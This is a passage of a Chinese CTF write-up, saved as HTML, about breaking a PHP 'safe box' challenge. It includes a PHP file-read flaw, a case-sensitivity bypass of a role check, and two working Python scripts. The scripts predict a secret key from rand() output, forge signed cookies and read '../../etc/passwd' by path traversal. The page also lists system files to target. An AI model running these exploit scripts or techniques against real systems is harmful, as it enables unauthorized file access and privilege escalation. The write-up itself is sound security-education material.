+<span class="p">{</span>
+    <span class="nv">$filename</span> <span class="o">=</span> <span class="nb">dirname</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">)</span> <span class="o">.</span> <span class="s2">"/"</span> <span class="o">.</span> <span class="nv">$filename</span><span class="p">;</span>
+    <span class="k">return</span> <span class="nb">file</span><span class="p">(</span><span class="nv">$filename</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="k">public</span> <span class="k">function</span> <span class="nf">read</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="nv">$filename</span> <span class="o">=</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'filename'</span><span class="p">])</span> <span class="o">?</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'filename'</span><span class="p">]</span> <span class="o">:</span> <span class="s2">"box.txt"</span><span class="p">;</span>
+    <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_read_file</span><span class="p">(</span><span class="nv">$filename</span><span class="p">);</span>
+<span class="p">}</span>
+</pre></div>
+<p>而read方法很明显是有任意文件读取漏洞的，所以现在做的是提权。</p>
+<p>我们执行fd_config()函数，可以得到权限分配的数组：</p>
+<p><a href="https://www.leavesongs.com/content/uploadfile/201606/421f1467123881.jpg"><img alt="14660765094390.jpg" src="./安全箱子的秘密  离别歌/thum-421f1467123881.jpg" title="点击查看原图"/></a>￼</p>
+<p>可以看到，admin对应的方法有read，而user对应的方法有view、alist、random，在flag.php的97行对权限进行检查：</p>
+<div class="codehilite"><pre><span></span><span class="cp">&lt;?php</span>
+<span class="k">if</span><span class="p">(</span><span class="nb">in_array</span><span class="p">(</span><span class="nv">$action</span><span class="p">,</span> <span class="nv">$config</span><span class="p">[</span><span class="s1">'role'</span><span class="p">][</span><span class="s1">'admin'</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nv">$role</span> <span class="o">!=</span> <span class="s2">"admin"</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">return</span> <span class="nx">fd_error</span><span class="p">(</span><span class="s1">'Admin permission denied!!'</span><span class="p">);</span>
+<span class="p">}</span>
+</pre></div>
+<p>当<code>$action</code>在<code>$config['role']['admin']</code>数组中时，如果你的role又不是admin，则提示权限错误。</p>
+<p>其实这里又涉及到php的大小写敏感问题，php语言的方法名、类名、函数名是大小写不敏感的，也就是说平时执行phpinfo()可以读取php信息，执行PhPInfO()效果也是一样的。</p>
+<p>所以，我只需要传入的<code>$action</code>为READ等包含大写字母即可绕过in_array的限制，而最后仍然可以执行read方法。</p>
+<p>执行read方法后即可读取任意文件，按常规渗透方式读取一些常见文件</p>
+<div class="codehilite"><pre><span></span>/etc/passwd
+/etc/hosts
+/etc/apache2/httpd.conf
+/etc/php5/php.ini
+/etc/cron 
+</pre></div>
+<p>在/etc/apache2/httpd.conf的最后几行发现flag：</p>
+<p><a href="https://www.leavesongs.com/content/uploadfile/201606/d6161467123965.jpg"><img alt="14660773376068.jpg" src="./安全箱子的秘密  离别歌/thum-d6161467123965.jpg" title="点击查看原图"/></a></p>
+<h2 id="0x04"><a class="toclink" href="#0x04">0x04 编写脚本</a></h2>
+<p>这个题其实难度并不大，但复杂，十分复杂，几乎不可能通过手工拿到flag，必须要写脚本。<br/>
+首先，我要先写一个获取SECRET_KEY的脚本，就是我在0x01中说到的，利用rand函数缺陷预测SECRET_KEY，并通过笛卡尔乘积生成可能的情况，一一测试，最终找到正确的SECRET_KEY。<br/>
+给出我的脚本：</p>
+<div class="codehilite"><pre><span></span><span class="ch">#!/usr/bin/env python</span>
+<span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">import</span> <span class="nn">re</span>
+<span class="kn">import</span> <span class="nn">itertools</span>
+<span class="kn">import</span> <span class="nn">random</span>
+<span class="kn">import</span> <span class="nn">string</span>
+<span class="kn">import</span> <span class="nn">hmac</span>
+<span class="kn">import</span> <span class="nn">hashlib</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+
+<span class="n">rand</span> <span class="o">=</span> <span class="s1">'0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'</span>
+<span class="n">target</span> <span class="o">=</span> <span class="s2">"http://0dac0a717c3cf340e.jie.sangebaimao.com:82/index.php"</span>
+
+<span class="k">def</span> <span class="nf">get_csrf_token</span><span class="p">(</span><span class="n">res</span><span class="p">):</span>
+    <span class="n">rex</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">r</span><span class="s1">'name="CSRF_TOKEN" value="(\w+)"'</span><span class="p">,</span> <span class="n">res</span><span class="o">.</span><span class="n">content</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">rex</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">str_to_random</span><span class="p">(</span><span class="n">lst</span><span class="p">):</span>
+    <span class="k">return</span> <span class="p">[</span><span class="n">rand</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="n">s</span><span class="p">)</span> <span class="k">for</span> <span class="n">s</span> <span class="ow">in</span> <span class="n">lst</span><span class="p">]</span>
+
+<span class="k">def</span> <span class="nf">random_to_str</span><span class="p">(</span><span class="n">lst</span><span class="p">):</span>
+    <span class="k">return</span> <span class="s1">''</span><span class="o">.</span><span class="n">join</span><span class="p">([</span><span class="n">rand</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="k">if</span> <span class="mi">0</span> <span class="o">&lt;=</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="nb">len</span><span class="p">(</span><span class="n">rand</span><span class="p">)</span> <span class="k">else</span> <span class="s1">'0'</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">lst</span><span class="p">])</span>
+
+<span class="k">def</span> <span class="nf">calc_key</span><span class="p">(</span><span class="n">lst</span><span class="p">):</span>
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">lst</span><span class="p">),</span> <span class="nb">len</span><span class="p">(</span><span class="n">lst</span><span class="p">)</span> <span class="o">+</span> <span class="mi">6</span><span class="p">):</span>
+        <span class="k">assert</span><span class="p">(</span><span class="n">lst</span><span class="p">[</span><span class="n">i</span> <span class="o">-</span> <span class="mi">31</span><span class="p">]</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
+        <span class="k">assert</span><span class="p">(</span><span class="n">lst</span><span class="p">[</span><span class="n">i</span> <span class="o">-</span> <span class="mi">3</span><span class="p">]</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
+        <span class="n">lst</span><span class="o">.</span><span class="n">append</span><span class="p">((</span><span class="n">lst</span><span class="p">[</span><span class="n">i</span> <span class="o">-</span> <span class="mi">31</span><span class="p">]</span> <span class="o">+</span> <span class="n">lst</span><span class="p">[</span><span class="n">i</span> <span class="o">-</span> <span class="mi">3</span><span class="p">])</span> <span class="o">%</span> <span class="nb">len</span><span class="p">(</span><span class="n">rand</span><span class="p">))</span>
+    <span class="k">return</span> <span class="n">lst</span><span class="p">[</span><span class="o">-</span><span class="mi">6</span><span class="p">:]</span>
+
+<span class="k">def</span> <span class="nf">test_token</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">secret</span><span class="p">):</span>
+    <span class="n">res</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">target</span><span class="p">)</span>
+    <span class="n">token</span> <span class="o">=</span> <span class="n">get_csrf_token</span><span class="p">(</span><span class="n">res</span><span class="p">)</span>
+    <span class="n">res</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span>
+        <span class="s2">"submit"</span><span class="p">:</span> <span class="s2">"1"</span><span class="p">,</span>
+        <span class="s2">"CSRF_TOKEN"</span><span class="p">:</span> <span class="n">token</span><span class="p">,</span>
+        <span class="s2">"act"</span><span class="p">:</span> <span class="s2">"phpinfo"</span><span class="p">,</span>
+        <span class="s2">"key"</span><span class="p">:</span> <span class="n">hash_hmac</span><span class="p">(</span><span class="s2">"phpinfo"</span><span class="p">,</span> <span class="n">secret</span><span class="p">)</span>
+    <span class="p">})</span>
+    <span class="k">if</span> <span class="n">res</span><span class="o">.</span><span class="n">content</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s2">"Permission deny!!"</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">:</span>
+        <span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">)</span>
+        <span class="k">print</span><span class="p">(</span><span class="s2">"[cookies ]"</span><span class="p">,</span> <span class="n">s</span><span class="o">.</span><span class="n">headers</span><span class="p">[</span><span class="s1">'Cookie'</span><span class="p">])</span>
+        <span class="k">print</span><span class="p">(</span><span class="s2">"[key ]"</span><span class="p">,</span> <span class="n">secret</span><span class="p">)</span>
+        <span class="k">print</span><span class="p">(</span><span class="s2">"[content ]"</span><span class="p">,</span> <span class="n">res</span><span class="o">.</span><span class="n">content</span><span class="p">)</span>
+        <span class="k">return</span> <span class="bp">True</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s2">"."</span><span class="p">)</span>
+        <span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">flush</span><span class="p">()</span>
+        <span class="k">return</span> <span class="bp">False</span>
+
+<span class="k">def</span> <span class="nf">hash_hmac</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">key</span><span class="p">):</span>
+    <span class="n">h</span> <span class="o">=</span> <span class="n">hmac</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">md5</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">h</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span>
+
+<span class="k">def</span> <span class="nf">rand_str</span><span class="p">(</span><span class="n">length</span><span class="p">):</span>
+    <span class="k">return</span> <span class="s1">''</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">random</span><span class="o">.</span><span class="n">choice</span><span class="p">(</span><span class="n">string</span><span class="o">.</span><span class="n">letters</span> <span class="o">+</span> <span class="n">string</span><span class="o">.</span><span class="n">digits</span><span class="p">)</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">length</span><span class="p">))</span>
+
+<span class="k">def</span> <span class="nf">calc_maybe</span><span class="p">(</span><span class="n">lst</span><span class="p">):</span>
+    <span class="n">prd</span> <span class="o">=</span> <span class="p">[]</span>
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">lst</span><span class="p">:</span>
+        <span class="n">prd</span><span class="o">.</span><span class="n">append</span><span class="p">((</span><span class="n">i</span><span class="p">,</span> <span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">))</span>
+    <span class="k">return</span> <span class="n">itertools</span><span class="o">.</span><span class="n">product</span><span class="p">(</span><span class="o">*</span><span class="n">prd</span><span class="p">)</span>
+
+<span class="n">rand_lst</span> <span class="o">=</span> <span class="p">[]</span>
+<span class="n">s</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">session</span><span class="p">();</span>
+<span class="n">s</span><span class="o">.</span><span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="s2">"User-Agent"</span><span class="p">:</span> <span class="s2">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) "</span>
+                  <span class="s2">"AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51"</span>
+                  <span class="s2">".0.2704.63 Safari/537.36"</span>
+<span class="p">}</span>
+
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">2</span><span class="p">):</span>
+    <span class="n">s</span><span class="o">.</span><span class="n">headers</span><span class="p">[</span><span class="s1">'Cookie'</span><span class="p">]</span> <span class="o">=</span> <span class="s2">"PHPSESSID={};"</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">rand_str</span><span class="p">(</span><span class="mi">12</span><span class="p">))</span>
+    <span class="n">res</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">target</span><span class="p">)</span>
+    <span class="n">token</span> <span class="o">=</span> <span class="n">get_csrf_token</span><span class="p">(</span><span class="n">res</span><span class="p">)</span>
+    <span class="n">rand_lst</span> <span class="o">+=</span> <span class="nb">list</span><span class="p">(</span><span class="s2">"</span><span class="se">\x00</span><span class="s2">"</span> <span class="o">*</span> <span class="mi">6</span><span class="p">)</span>
+    <span class="n">rand_lst</span> <span class="o">+=</span> <span class="nb">list</span><span class="p">(</span><span class="n">token</span><span class="p">)</span>
+
+<span class="c1">#print(rand_lst)</span>
+<span class="n">rand_lst</span> <span class="o">=</span> <span class="n">str_to_random</span><span class="p">(</span><span class="n">rand_lst</span><span class="p">)</span>
+
+<span class="n">key_arr</span> <span class="o">=</span> <span class="n">calc_key</span><span class="p">(</span><span class="n">rand_lst</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="s2">"[calc key] "</span><span class="p">,</span> <span class="n">key_arr</span><span class="p">)</span>
+
+<span class="n">s</span><span class="o">.</span><span class="n">headers</span><span class="p">[</span><span class="s1">'Cookie'</span><span class="p">]</span> <span class="o">=</span> <span class="s2">"PHPSESSID={};"</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">rand_str</span><span class="p">(</span><span class="mi">12</span><span class="p">))</span>
+<span class="k">for</span> <span class="n">fkey</span> <span class="ow">in</span> <span class="n">calc_maybe</span><span class="p">(</span><span class="n">key_arr</span><span class="p">):</span>
+    <span class="k">if</span> <span class="n">test_token</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">random_to_str</span><span class="p">(</span><span class="n">fkey</span><span class="p">)):</span>
+        <span class="k">break</span>
+</pre></div>
+<p>有几点要注意的：</p>
+<ul>
+<li>CSRF_TOKEN每次使用完就会销毁，所以每次发送POST请求之前都需要获取一个CSRF_TOKEN</li>
+<li>为了保证Keep-Alive，使用requests库的session类来维持会话</li>
+<li>为了生成44个随机数，需要发送两次数据包，发送数据包前需要更换sessionid，否则第二次不会再生成新的随机数。我的做法是发送前自己生成随机字符串作为sessionid</li>
+<li>笛卡尔积可以用python的itertools.product方法</li>
+<li>最终获取准确的secret_key后，要输出这个secret_key，同时还要输出当前sessionid，后续操作均需要带着这个sessionid</li>
+</ul>
+<p>这个脚本有一定的失败率，具体为什么不细讲了，多试几次肯定Ok就是了：</p>
+<p><a href="https://www.leavesongs.com/content/uploadfile/201606/d69a1467124023.jpg"><img alt="14660780995414.jpg" src="./安全箱子的秘密  离别歌/thum-d69a1467124023.jpg" title="点击查看原图"/></a></p>
+<p>拿到key了，然后我们再写一个脚本。这个脚本的目的是读取文件：</p>
+<div class="codehilite"><pre><span></span><span class="ch">#!/usr/bin/env python</span>
+<span class="kn">import</span> <span class="nn">hmac</span>
+<span class="kn">import</span> <span class="nn">hashlib</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+<span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">import</span> <span class="nn">re</span>
+<span class="kn">import</span> <span class="nn">urlparse</span>
+<span class="kn">import</span> <span class="nn">json</span>
+<span class="kn">import</span> <span class="nn">base64</span>
+<span class="kn">import</span> <span class="nn">urllib</span>
+
+<span class="n">secret</span> <span class="o">=</span> <span class="s2">"5ist0d"</span>
+<span class="n">session</span> <span class="o">=</span> <span class="s2">"eiZCh9cVSo35"</span>
+<span class="n">target</span> <span class="o">=</span> <span class="s2">"http://0dac0a717c3cf340e.jie.sangebaimao.com:82/index.php"</span>
+
+<span class="k">def</span> <span class="nf">get_csrf_token</span><span class="p">(</span><span class="n">res</span><span class="p">):</span>
+    <span class="n">rex</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">r</span><span class="s1">'name="CSRF_TOKEN" value="(\w+)"'</span><span class="p">,</span> <span class="n">res</span><span class="o">.</span><span class="n">content</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">rex</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">hash_hmac</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">key</span><span class="p">):</span>
+    <span class="n">h</span> <span class="o">=</span> <span class="n">hmac</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">md5</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">h</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span>
+
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">'__main__'</span><span class="p">:</span>
+    <span class="n">func</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+    <span class="n">post_data</span> <span class="o">=</span> <span class="p">{}</span>
+    <span class="n">cookie</span> <span class="o">=</span> <span class="s1">'{"role": "</span><span class="se">\\</span><span class="s1">u0075ser"}'</span>
+    <span class="n">auth</span> <span class="o">=</span> <span class="n">hash_hmac</span><span class="p">(</span><span class="n">cookie</span><span class="p">,</span> <span class="n">secret</span><span class="p">)</span>
+    <span class="n">s</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">session</span><span class="p">()</span>
+    <span class="n">s</span><span class="o">.</span><span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="s2">"Cookie"</span><span class="p">:</span> <span class="s2">"PHPSESSID={}; userinfo={}"</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">session</span><span class="p">,</span> <span class="n">urllib</span><span class="o">.</span><span class="n">quote</span><span class="p">(</span><span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">auth</span><span class="o">+</span><span class="n">cookie</span><span class="p">))),</span>
+        <span class="s2">"User-Agent"</span><span class="p">:</span> <span class="s2">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) "</span>
+                      <span class="s2">"AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51"</span>
+                      <span class="s2">".0.2704.63 Safari/537.36"</span><span class="p">,</span>
+        <span class="s2">"X-REQUESTED-WITH"</span><span class="p">:</span> <span class="s2">"XMLHttpRequest"</span>
+    <span class="p">}</span>
+
+    <span class="n">res</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">target</span><span class="p">)</span>
+    <span class="n">token</span> <span class="o">=</span> <span class="n">get_csrf_token</span><span class="p">(</span><span class="n">res</span><span class="p">)</span>
+    <span class="n">post_data</span><span class="o">.</span><span class="n">update</span><span class="p">({</span>
+        <span class="s2">"submit"</span><span class="p">:</span> <span class="s2">"1"</span><span class="p">,</span>
+        <span class="s2">"CSRF_TOKEN"</span><span class="p">:</span> <span class="n">token</span><span class="p">,</span>
+        <span class="s2">"act"</span><span class="p">:</span> <span class="n">func</span><span class="p">,</span>
+        <span class="s2">"key"</span><span class="p">:</span> <span class="n">hash_hmac</span><span class="p">(</span><span class="n">func</span><span class="p">,</span> <span class="n">secret</span><span class="p">),</span> 
+        <span class="s2">"method"</span><span class="p">:</span> <span class="s2">"reaD"</span><span class="p">,</span>
+        <span class="s2">"filename"</span><span class="p">:</span> <span class="s2">"../../etc/passwd"</span>
+    <span class="p">})</span>
+    <span class="n">res</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">post_data</span><span class="p">)</span>
+    <span class="k">print</span><span class="p">(</span><span class="n">res</span><span class="o">.</span><span class="n">content</span><span class="p">)</span>
+</pre></div>
+<p>将刚才获取的secret和sessionid填入脚本，执行即可读取../../etc/passwd文件。我们可以在sys.argv[1]传入想执行的函数，比如</p>
+<div class="codehilite"><pre><span></span>./calc.py fd_show_source
+./calc.py fd_config
+./calc.py fg_safebox 
+</pre></div>
+<p>当然，最终我们要执行的是fg_safebox，在post包中设置method=reaD，filename是想读的文件，cookie中配置好role=user的json字符串，执行即可：</p>
+<p><a href="https://www.leavesongs.com/content/uploadfile/201606/57fd1467184681.jpg"><img alt="14660788476962.jpg" src="./安全箱子的秘密  离别歌/thum-57fd1467184681.jpg" title="点击查看原图"/></a></p>
+</div>
+</article>
+<div id="reply-list">
+<h1>评论</h1>
+<div class="row" id="comment-2376">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./安全箱子的秘密  离别歌/978f3169e62f7a7909a22f72bcc871d6.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="http://www.baidu.com" target="_blank">骗子A</a>
+<time datetime="2016年7月11日 12:45" itemprop="datePublished">
+                            2016 七月 11 12:45
+                        </time>
+<a href="javascript:reply_to('2376', '骗子A')">回复</a>
+</p>
+<p class="comment-meta">你好 我不知道你能不能看到这个  我被一个外国网站骗了钱 想找你帮帮忙 真的非常感谢了 之前也找了很多人 也是一直被骗到了现在</p>
+</div>
+</div>
+<div class="row" id="comment-2373">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./安全箱子的秘密  离别歌/7fc2d5c0b745eb9df8e5cb662d8535c3.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="http://sh3ll.me" target="_blank">Chu</a>
+<time datetime="2016年7月5日 12:43" itemprop="datePublished">
+                            2016 七月 05 12:43
+                        </time>
+<a href="javascript:reply_to('2373', 'Chu')">回复</a>
+</p>
+<p class="comment-meta">你好 我不知道你能不能看到这个  我被一个外国网站骗了钱 想找你帮帮忙 真的非常感谢了 之前也找了很多人 也是一直被骗到了现在</p>
+</div>
+</div>
+<div class="row" id="comment-2372">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./安全箱子的秘密  离别歌/d41d8cd98f00b204e9800998ecf8427e.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="http://Venenof.com" target="_blank">Veneno</a>
+<time datetime="2016年7月3日 15:22" itemprop="datePublished">
+                            2016 七月 03 15:22
+                        </time>
+<a href="javascript:reply_to('2372', 'Veneno')">回复</a>
+</p>
+<p class="comment-meta">学习</p>
+</div>
+</div>
+<div class="row" id="comment-2371">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./安全箱子的秘密  离别歌/1bddbdfa18dd206fa889da75978b9fdd.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="" target="_blank">人模狗样</a>
+<time datetime="2016年7月2日 18:27" itemprop="datePublished">
+                            2016 七月 02 18:27
+                        </time>
+<a href="javascript:reply_to('2371', '人模狗样')">回复</a>
+</p>
+<p class="comment-meta">你好 我不知道你能不能看到这个  我被一个外国网站骗了钱 想找你帮帮忙 真的非常感谢了 之前也找了很多人 也是一直被骗到了现在</p>
+</div>
+</div>
+</div>
+<form action="#reply" enctype="multipart/form-data" id="reply" method="post">
+<textarea cols="40" id="id_content" name="content" required="" rows="6">
+</textarea>
+<div class="row">
+<div class="col-xs-4">
+<input id="id_nickname" maxlength="64" name="nickname" placeholder="昵称" required="" type="text"/>
+</div>
+<div class="col-xs-4">
+<input id="id_email" maxlength="254" name="email" placeholder="邮箱（可留空）" type="text"/>
+</div>
+<div class="col-xs-4">
+<input id="id_url" maxlength="200" name="url" placeholder="链接（可留空）" type="text"/>
+</div>
+</div>
+<div class="row" style="margin-top: 8px"><div class="col-xs-4"><input autocomplete="off" id="id_captcha_1" name="captcha_1" placeholder="验证码" type="text"/> <input id="id_captcha_0" name="captcha_0" type="hidden" value="b588fb8d82bb7eb318c7c4afb45cc7c5519f1609"/>
+</div><div class="col-xs-4">
+<img alt="captcha" class="captcha" height="25" src="./安全箱子的秘密  离别歌/b588fb8d82bb7eb318c7c4afb45cc7c5519f1609"/></div></div>
+<div class="clearfix"></div>
+<input class="ui-button ui-button-sgreen" type="submit" value="提交"/>
+<input id="id_archive" name="archive" type="hidden" value="388">
+<input id="id_parent" name="parent" type="hidden"/>
+<input name="csrfmiddlewaretoken" type="hidden" value="JzRZZHFhRiUkaoETFCuKusuROmQmVZ8UhTcvNbRwi5OJa328tTYu36wWXqjuEtX4"/>
+</input></form>
+</div>
+<footer id="footer">
+<div class="footer-left">
+    Copyright © 2017 Powered by talkbook
+  </div>
+<div class="footer-right">
+<nav>
+<ul>
+<li><a href="/">首页</a></li>
+<li><a href="http://weibo.com/101yx" target="_blank">微博</a></li>
+<li><a href="https://github.com/phith0n" target="_blank">项目</a></li>
+<li><a href="/template/change/">更换模板</a></li>
+</ul>
+</nav>
+</div>
+</footer>
+<script src="./安全箱子的秘密  离别歌/main.js"></script>
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?ad9ab5e37c2811b9f0979e46123fc898";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+<script src="./安全箱子的秘密  离别歌/jquery.fancybox.pack.js"></script>
+<script>
+$(document).ready(function () {
+    $("article a").each(function (i, e) {
+        if(e.host != 'www.leavesongs.com') {
+            e.target = '_blank';
+        }
+    });
+    $("article img").each(function (i, e) {
+        if(e.parentNode.tagName.toUpperCase() != 'A') {
+            $(e).wrap('<a href="'+escapeHtml(e.src)+'" class="fancybox"></a>');
+        } else {
+            $(e.parentNode).addClass('fancybox');
+        }
+    });
+    $('.fancybox').fancybox();
+})
+</script>
+</body>
+</html>
